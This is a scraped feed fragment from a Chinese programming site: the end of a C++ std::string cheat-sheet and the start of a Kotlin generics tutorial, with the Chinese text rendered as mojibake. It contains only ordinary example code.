<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span>    <span class="hljs-comment">// ä¸»è¦å¤´æ–‡ä»¶</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span>  <span class="hljs-comment">// ç”¨äºè¾“å…¥è¾“å‡º</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sstream&gt;</span>   <span class="hljs-comment">// å­—ç¬¦ä¸²æµå¤„ç†</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span> <span class="hljs-comment">// ç”¨äºå­—ç¬¦ä¸²ç®—æ³•</span></span>
</code></pre>
<hr/>
<h2 data-id="heading-1">å¿…é¡»æŒæ¡çš„å­—ç¬¦ä¸²æ“ä½œ</h2>
<h3 data-id="heading-2">1. å­—ç¬¦ä¸²åˆ›å»ºå’Œåˆå§‹åŒ–</h3>
<pre><code class="hljs language-cpp" lang="cpp">string str1;                    <span class="hljs-comment">// ç©ºå­—ç¬¦ä¸²</span>
string str2 = <span class="hljs-string">"Hello"</span>;         <span class="hljs-comment">// ç›´æ¥åˆå§‹åŒ–</span>
<span class="hljs-function">string <span class="hljs-title">str3</span><span class="hljs-params">(<span class="hljs-string">"World"</span>)</span></span>;          <span class="hljs-comment">// æ„é€ å‡½æ•°åˆå§‹åŒ–</span>
<span class="hljs-function">string <span class="hljs-title">str4</span><span class="hljs-params">(<span class="hljs-number">5</span>, <span class="hljs-string">'A'</span>)</span></span>;           <span class="hljs-comment">// "AAAAA"</span>
string str5 = str2 + <span class="hljs-string">" "</span> + str3; <span class="hljs-comment">// å­—ç¬¦ä¸²æ‹¼æ¥</span>
</code></pre>
<h3 data-id="heading-3">2. è·å–å­—ç¬¦ä¸²ä¿¡æ¯</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-type">int</span> len = str.<span class="hljs-built_in">length</span>();        <span class="hljs-comment">// å­—ç¬¦ä¸²é•¿åº¦</span>
<span class="hljs-type">int</span> size = str.<span class="hljs-built_in">size</span>();         <span class="hljs-comment">// åŒlength()</span>
<span class="hljs-type">bool</span> empty = str.<span class="hljs-built_in">empty</span>();      <span class="hljs-comment">// æ˜¯å¦ä¸ºç©º</span>
</code></pre>
<h3 data-id="heading-4">3. è®¿é—®å­—ç¬¦ä¸²å†…å®¹</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-type">char</span> first = str[<span class="hljs-number">0</span>];           <span class="hljs-comment">// é€šè¿‡ä¸‹æ ‡è®¿é—®</span>
<span class="hljs-type">char</span> first_safe = str.<span class="hljs-built_in">at</span>(<span class="hljs-number">0</span>);   <span class="hljs-comment">// å®‰å…¨è®¿é—®ï¼Œä¼šæ£€æŸ¥è¾¹ç•Œ</span>
<span class="hljs-type">char</span> last = str.<span class="hljs-built_in">back</span>();        <span class="hljs-comment">// æœ€åä¸€ä¸ªå­—ç¬¦</span>
<span class="hljs-type">char</span> first_char = str.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">// ç¬¬ä¸€ä¸ªå­—ç¬¦</span>
</code></pre>
<h3 data-id="heading-5">4. å­—ç¬¦ä¸²æŸ¥æ‰¾</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-type">size_t</span> pos = str.<span class="hljs-built_in">find</span>(<span class="hljs-string">"hello"</span>);    <span class="hljs-comment">// æŸ¥æ‰¾å­ä¸²</span>
<span class="hljs-type">size_t</span> rpos = str.<span class="hljs-built_in">rfind</span>(<span class="hljs-string">"hello"</span>);  <span class="hljs-comment">// ä»åå¾€å‰æŸ¥æ‰¾</span>
<span class="hljs-type">size_t</span> found = str.<span class="hljs-built_in">find_first_of</span>(<span class="hljs-string">"aeiou"</span>);  <span class="hljs-comment">// æŸ¥æ‰¾ä»»æ„åŒ¹é…å­—ç¬¦</span>
<span class="hljs-type">size_t</span> notfound = str.<span class="hljs-built_in">find_first_not_of</span>(<span class="hljs-string">"0123456789"</span>); <span class="hljs-comment">// æŸ¥æ‰¾éæ•°å­—å­—ç¬¦</span>
</code></pre>
<h3 data-id="heading-6">5. å­—ç¬¦ä¸²ä¿®æ”¹</h3>
<pre><code class="hljs language-cpp" lang="cpp">str.<span class="hljs-built_in">append</span>(<span class="hljs-string">" World"</span>);          <span class="hljs-comment">// è¿½åŠ å­—ç¬¦ä¸²</span>
str.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">'!'</span>);            <span class="hljs-comment">// è¿½åŠ å•ä¸ªå­—ç¬¦</span>
str.<span class="hljs-built_in">insert</span>(<span class="hljs-number">5</span>, <span class="hljs-string">" Beautiful"</span>);   <span class="hljs-comment">// åœ¨æŒ‡å®šä½ç½®æ’å…¥</span>
str.<span class="hljs-built_in">erase</span>(<span class="hljs-number">5</span>, <span class="hljs-number">10</span>);              <span class="hljs-comment">// åˆ é™¤ä»ä½ç½®5å¼€å§‹çš„10ä¸ªå­—ç¬¦</span>
str.<span class="hljs-built_in">replace</span>(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-string">"Hi"</span>);       <span class="hljs-comment">// æ›¿æ¢ä»ä½ç½®0å¼€å§‹çš„5ä¸ªå­—ç¬¦</span>
</code></pre>
<h3 data-id="heading-7">6. å­—ç¬¦ä¸²æ¯”è¾ƒ</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-type">bool</span> equal = (str1 == str2);   <span class="hljs-comment">// ç›´æ¥æ¯”è¾ƒ</span>
<span class="hljs-type">int</span> result = str1.<span class="hljs-built_in">compare</span>(str2); <span class="hljs-comment">// è¿”å›0è¡¨ç¤ºç›¸ç­‰ï¼Œ&lt;0è¡¨ç¤ºstr1å°ï¼Œ&gt;0è¡¨ç¤ºstr1å¤§</span>
<span class="hljs-type">bool</span> starts = str.<span class="hljs-built_in">starts_with</span>(<span class="hljs-string">"Hello"</span>); <span class="hljs-comment">// C++20 æ£€æŸ¥å‰ç¼€</span>
<span class="hljs-type">bool</span> ends = str.<span class="hljs-built_in">ends_with</span>(<span class="hljs-string">"World"</span>);     <span class="hljs-comment">// C++20 æ£€æŸ¥åç¼€</span>
</code></pre>
<h3 data-id="heading-8">7. å­ä¸²æ“ä½œ</h3>
<pre><code class="hljs language-cpp" lang="cpp">string sub = str.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>);     <span class="hljs-comment">// ä»ä½ç½®0å¼€å§‹å–5ä¸ªå­—ç¬¦</span>
string sub2 = str.<span class="hljs-built_in">substr</span>(<span class="hljs-number">6</span>);       <span class="hljs-comment">// ä»ä½ç½®6å¼€å§‹åˆ°ç»“å°¾</span>
</code></pre>
<h3 data-id="heading-9">8. å­—ç¬¦ä¸²è½¬æ¢</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// æ•°å­—è½¬å­—ç¬¦ä¸²</span>
string num_str = <span class="hljs-built_in">to_string</span>(<span class="hljs-number">123</span>);

<span class="hljs-comment">// å­—ç¬¦ä¸²è½¬æ•°å­—</span>
<span class="hljs-type">int</span> num = <span class="hljs-built_in">stoi</span>(<span class="hljs-string">"456"</span>);
<span class="hljs-type">double</span> d = <span class="hljs-built_in">stod</span>(<span class="hljs-string">"3.14"</span>);
<span class="hljs-type">long</span> l = <span class="hljs-built_in">stol</span>(<span class="hljs-string">"1000000"</span>);

<span class="hljs-comment">// å¤§å°å†™è½¬æ¢</span>
<span class="hljs-built_in">transform</span>(str.<span class="hljs-built_in">begin</span>(), str.<span class="hljs-built_in">end</span>(), str.<span class="hljs-built_in">begin</span>(), ::tolower);
<span class="hljs-built_in">transform</span>(str.<span class="hljs-built_in">begin</span>(), str.<span class="hljs-built_in">end</span>(), str.<span class="hljs-built_in">begin</span>(), ::toupper);
</code></pre>
<h3 data-id="heading-10">9. å­—ç¬¦ä¸²æµå¤„ç†</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// å­—ç¬¦ä¸²åˆ†å‰²</span>
<span class="hljs-function">stringstream <span class="hljs-title">ss</span><span class="hljs-params">(<span class="hljs-string">"apple,banana,orange"</span>)</span></span>;
string item;
<span class="hljs-keyword">while</span> (<span class="hljs-built_in">getline</span>(ss, item, <span class="hljs-string">','</span>)) {
    cout &lt;&lt; item &lt;&lt; endl;
}

<span class="hljs-comment">// æ ¼å¼åŒ–å­—ç¬¦ä¸²</span>
stringstream ss2;
ss2 &lt;&lt; <span class="hljs-string">"Name: "</span> &lt;&lt; name &lt;&lt; <span class="hljs-string">", Age: "</span> &lt;&lt; age;
string result = ss2.<span class="hljs-built_in">str</span>();
</code></pre>
<h3 data-id="heading-11">10. å­—ç¬¦ä¸²æ¸…ç†å’Œä¿®å‰ª</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// å»é™¤å‰åç©ºæ ¼ï¼ˆè‡ªå®šä¹‰å‡½æ•°ï¼‰</span>
<span class="hljs-function">string <span class="hljs-title">trim</span><span class="hljs-params">(<span class="hljs-type">const</span> string&amp; str)</span> </span>{
    <span class="hljs-type">size_t</span> start = str.<span class="hljs-built_in">find_first_not_of</span>(<span class="hljs-string">" \t\n\r"</span>);
    <span class="hljs-type">size_t</span> end = str.<span class="hljs-built_in">find_last_not_of</span>(<span class="hljs-string">" \t\n\r"</span>);
    <span class="hljs-keyword">return</span> (start == string::npos) ? <span class="hljs-string">""</span> : str.<span class="hljs-built_in">substr</span>(start, end - start + <span class="hljs-number">1</span>);
}
</code></pre>
<hr/>
<h2 data-id="heading-12">å¸¸ç”¨æ¨¡å¼é€Ÿè®°</h2>
<h3 data-id="heading-13">1. å­—ç¬¦ä¸²åˆ†å‰²</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">split</span><span class="hljs-params">(<span class="hljs-type">const</span> string&amp; str, <span class="hljs-type">char</span> delimiter)</span> </span>{
    vector&lt;string&gt; tokens;
    <span class="hljs-function">stringstream <span class="hljs-title">ss</span><span class="hljs-params">(str)</span></span>;
    string token;
    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">getline</span>(ss, token, delimiter)) {
        tokens.<span class="hljs-built_in">push_back</span>(token);
    }
    <span class="hljs-keyword">return</span> tokens;
}
</code></pre>
<h3 data-id="heading-14">2. å­—ç¬¦ä¸²æ›¿æ¢</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">string <span class="hljs-title">replace_all</span><span class="hljs-params">(string str, <span class="hljs-type">const</span> string&amp; from, <span class="hljs-type">const</span> string&amp; to)</span> </span>{
    <span class="hljs-type">size_t</span> start_pos = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">while</span> ((start_pos = str.<span class="hljs-built_in">find</span>(from, start_pos)) != string::npos) {
        str.<span class="hljs-built_in">replace</span>(start_pos, from.<span class="hljs-built_in">length</span>(), to);
        start_pos += to.<span class="hljs-built_in">length</span>();
    }
    <span class="hljs-keyword">return</span> str;
}
</code></pre>
<h3 data-id="heading-15">3. æ£€æŸ¥å­—ç¬¦ä¸²å†…å®¹</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">is_number</span><span class="hljs-params">(<span class="hljs-type">const</span> string&amp; str)</span> </span>{
    <span class="hljs-keyword">return</span> !str.<span class="hljs-built_in">empty</span>() &amp;&amp; <span class="hljs-built_in">all_of</span>(str.<span class="hljs-built_in">begin</span>(), str.<span class="hljs-built_in">end</span>(), ::isdigit);
}

<span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">contains</span><span class="hljs-params">(<span class="hljs-type">const</span> string&amp; str, <span class="hljs-type">const</span> string&amp; substring)</span> </span>{
    <span class="hljs-keyword">return</span> str.<span class="hljs-built_in">find</span>(substring) != string::npos;
}
</code></pre>
<hr/>
<h2 data-id="heading-16">å®Œæ•´ç¤ºä¾‹ï¼šç»¼åˆå­—ç¬¦ä¸²æ“ä½œ</h2>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sstream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// åˆ›å»ºå’Œåˆå§‹åŒ–</span>
    string text = <span class="hljs-string">"Hello World, Welcome to C++ Programming!"</span>;
    
    <span class="hljs-comment">// åŸºæœ¬ä¿¡æ¯</span>
    cout &lt;&lt; <span class="hljs-string">"é•¿åº¦: "</span> &lt;&lt; text.<span class="hljs-built_in">length</span>() &lt;&lt; endl;
    cout &lt;&lt; <span class="hljs-string">"æ˜¯å¦ä¸ºç©º: "</span> &lt;&lt; text.<span class="hljs-built_in">empty</span>() &lt;&lt; endl;
    
    <span class="hljs-comment">// æŸ¥æ‰¾</span>
    <span class="hljs-type">size_t</span> pos = text.<span class="hljs-built_in">find</span>(<span class="hljs-string">"C++"</span>);
    <span class="hljs-keyword">if</span> (pos != string::npos) {
        cout &lt;&lt; <span class="hljs-string">"æ‰¾åˆ°C++åœ¨ä½ç½®: "</span> &lt;&lt; pos &lt;&lt; endl;
    }
    
    <span class="hljs-comment">// ä¿®æ”¹</span>
    text.<span class="hljs-built_in">replace</span>(pos, <span class="hljs-number">3</span>, <span class="hljs-string">"Python"</span>);
    cout &lt;&lt; <span class="hljs-string">"æ›¿æ¢å: "</span> &lt;&lt; text &lt;&lt; endl;
    
    <span class="hljs-comment">// å¤§å°å†™è½¬æ¢</span>
    <span class="hljs-built_in">transform</span>(text.<span class="hljs-built_in">begin</span>(), text.<span class="hljs-built_in">end</span>(), text.<span class="hljs-built_in">begin</span>(), ::tolower);
    cout &lt;&lt; <span class="hljs-string">"å°å†™: "</span> &lt;&lt; text &lt;&lt; endl;
    
    <span class="hljs-comment">// å­—ç¬¦ä¸²åˆ†å‰²</span>
    string data = <span class="hljs-string">"apple,banana,orange,grape"</span>;
    <span class="hljs-function">stringstream <span class="hljs-title">ss</span><span class="hljs-params">(data)</span></span>;
    string fruit;
    cout &lt;&lt; <span class="hljs-string">"æ°´æœåˆ—è¡¨: "</span>;
    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">getline</span>(ss, fruit, <span class="hljs-string">','</span>)) {
        cout &lt;&lt; fruit &lt;&lt; <span class="hljs-string">" "</span>;
    }
    cout &lt;&lt; endl;
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<hr/>
<h2 data-id="heading-17">é€Ÿè®°å£è¯€</h2>
<blockquote>
<p>å­—ç¬¦ä¸²ï¼Œ<code>&lt;string&gt;</code> å¤´ï¼›<br/>
åˆ›å»ºæ‹¼æ¥æœ€å¸¸ç”¨ï¼›<br/>
æŸ¥æ‰¾ç”¨ <code>find</code>ï¼Œæ›¿æ¢ç”¨ <code>replace</code>ï¼›<br/>
æµå¤„ç†ï¼Œåˆ†å‰²å¼ºï¼›<br/>
å¤§å°å†™ï¼Œ<code>transform</code>ï¼</p>
</blockquote>
<hr/>
<p>ä¸‹æ¬¡å†é‡åˆ°å­—ç¬¦ä¸²å¤„ç†ï¼Œç›´æ¥çœ‹è¿™ä»½ç¬”è®°å°±è¡Œï¼Œä¸ç”¨å†åˆ°å¤„æŸ¥æ–‡æ¡£äº†ï¼è®°ä½ï¼šå¤šç»ƒä¹ æ‰æ˜¯æŒæ¡çš„å…³é”®ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[kotlin-5]]></title>    <link>https://juejin.cn/post/7575897635137814528</link>    <guid>https://juejin.cn/post/7575897635137814528</guid>    <pubDate>2025-11-24T11:51:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575897635137814528" data-draft-id="7571278865516298290" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="kotlin-5"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2025-11-24T11:51:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é£å†·"/> <meta itemprop="url" content="https://juejin.cn/user/3843548379091742"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            kotlin-5
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3843548379091742/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é£å†·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T11:51:51.000Z" title="Mon Nov 24 2025 11:51:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤ªæ£’äº†ï¼ç°åœ¨è®©æˆ‘ä»¬è¿›å…¥ Kotlin æ›´æ·±å…¥çš„é«˜çº§ç‰¹æ€§å’Œå®é™…åº”ç”¨åœºæ™¯ã€‚è¿™éƒ¨åˆ†å°†æ¶µç›–<strong>æ³›å‹ã€æ³¨è§£ã€åå°„ã€DSL</strong>ç­‰ä¼ä¸šçº§å¼€å‘å¿…å¤‡æŠ€èƒ½ã€‚</p>
<hr/>
<h3 data-id="heading-0"><strong>Kotlin é«˜çº§ç‰¹æ€§ï¼šä¼ä¸šçº§å¼€å‘å®æˆ˜</strong></h3>
<h4 data-id="heading-1"><strong>ä¸‰åäºŒã€æ³›å‹æ·±å…¥ï¼šå‹å˜ã€æ˜ŸæŠ•å½±ä¸ reified</strong></h4>
<h5 data-id="heading-2"><strong>1. å‹å˜ï¼ˆVarianceï¼‰</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ä¸å˜ï¼ˆInvariantï¼‰- é»˜è®¤è¡Œä¸º</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Box</span>&lt;<span class="hljs-type">T</span>&gt;(<span class="hljs-keyword">val</span> value: T)

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> stringBox = Box(<span class="hljs-string">"Hello"</span>)
    <span class="hljs-comment">// val anyBox: Box&lt;Any&gt; = stringBox // é”™è¯¯ï¼Box&lt;String&gt; ä¸æ˜¯ Box&lt;Any&gt; çš„å­ç±»å‹</span>
}

<span class="hljs-comment">// åå˜ï¼ˆCovariantï¼‰- ä½¿ç”¨ out å…³é”®å­—</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ReadOnlyBox</span>&lt;<span class="hljs-type">out T</span>&gt;(<span class="hljs-keyword">val</span> value: T) {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">get</span><span class="hljs-params">()</span></span>: T = value
    <span class="hljs-comment">// fun set(newValue: T) {} // é”™è¯¯ï¼ä¸èƒ½æœ‰æ¶ˆè´¹ T çš„æ–¹æ³•</span>
}

<span class="hljs-comment">// é€†å˜ï¼ˆContravariantï¼‰- ä½¿ç”¨ in å…³é”®å­—</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">WriteOnlyBox</span>&lt;<span class="hljs-type">in T</span>&gt; {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">set</span><span class="hljs-params">(value: <span class="hljs-type">T</span>)</span></span> {
        println(<span class="hljs-string">"è®¾ç½®å€¼: <span class="hljs-variable">$value</span>"</span>)
    }
    <span class="hljs-comment">// fun get(): T // é”™è¯¯ï¼ä¸èƒ½æœ‰ç”Ÿäº§ T çš„æ–¹æ³•</span>
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testVariance</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// åå˜ç¤ºä¾‹</span>
    <span class="hljs-keyword">val</span> stringBox: ReadOnlyBox&lt;String&gt; = ReadOnlyBox(<span class="hljs-string">"Text"</span>)
    <span class="hljs-keyword">val</span> anyBox: ReadOnlyBox&lt;Any&gt; = stringBox <span class="hljs-comment">// æ­£ç¡®ï¼å› ä¸º out å…³é”®å­—</span>
    
    <span class="hljs-comment">// é€†å˜ç¤ºä¾‹</span>
    <span class="hljs-keyword">val</span> anyWriteBox: WriteOnlyBox&lt;Any&gt; = WriteOnlyBox()
    <span class="hljs-keyword">val</span> stringWriteBox: WriteOnlyBox&lt;String&gt; = anyWriteBox <span class="hljs-comment">// æ­£ç¡®ï¼å› ä¸º in å…³é”®å­—</span>
}
</code></pre>
<h5 data-id="heading-3"><strong>2. æ˜ŸæŠ•å½±ï¼ˆStar Projectionï¼‰</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">printSize</span><span class="hljs-params">(list: <span class="hljs-type">List</span>&lt;*&gt;)</span></span> {
    println(<span class="hljs-string">"åˆ—è¡¨å¤§å°: <span class="hljs-subst">${list.size}</span>"</span>)
    <span class="hljs-comment">// println(list[0]) // ä¸èƒ½å®‰å…¨åœ°è®¿é—®å…ƒç´ å†…å®¹</span>
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> <span class="hljs-title">compareFirstSecond</span><span class="hljs-params">(list: <span class="hljs-type">List</span>&lt;<span class="hljs-type">T</span>&gt;, comparator: <span class="hljs-type">Comparator</span>&lt;<span class="hljs-type">in</span> <span class="hljs-type">T</span>&gt;)</span></span>: <span class="hljs-built_in">Boolean</span> 
    <span class="hljs-keyword">where</span> T : Comparable&lt;T&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (list.size &gt;= <span class="hljs-number">2</span>) {
        comparator.compare(list[<span class="hljs-number">0</span>], list[<span class="hljs-number">1</span>]) &gt; <span class="hljs-number">0</span>
    } <span class="hljs-keyword">else</span> <span class="hljs-literal">false</span>
}

<span class="hljs-comment">// ä½¿ç”¨ reified å…³é”®å­—å®ç°ç±»å‹æ£€æŸ¥</span>
<span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;<span class="hljs-keyword">reified</span> T&gt;</span> <span class="hljs-title">checkType</span><span class="hljs-params">(value: <span class="hljs-type">Any</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">return</span> value <span class="hljs-keyword">is</span> T
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> list = listOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)
    printSize(list)
    
    println(checkType&lt;String&gt;(<span class="hljs-string">"Hello"</span>)) <span class="hljs-comment">// true</span>
    println(checkType&lt;<span class="hljs-built_in">Int</span>&gt;(<span class="hljs-string">"Hello"</span>))    <span class="hljs-comment">// false</span>
}
</code></pre>
<h4 data-id="heading-4"><strong>ä¸‰åä¸‰ã€æ³¨è§£ä¸åå°„</strong></h4>
<h5 data-id="heading-5"><strong>1. è‡ªå®šä¹‰æ³¨è§£</strong></h5>
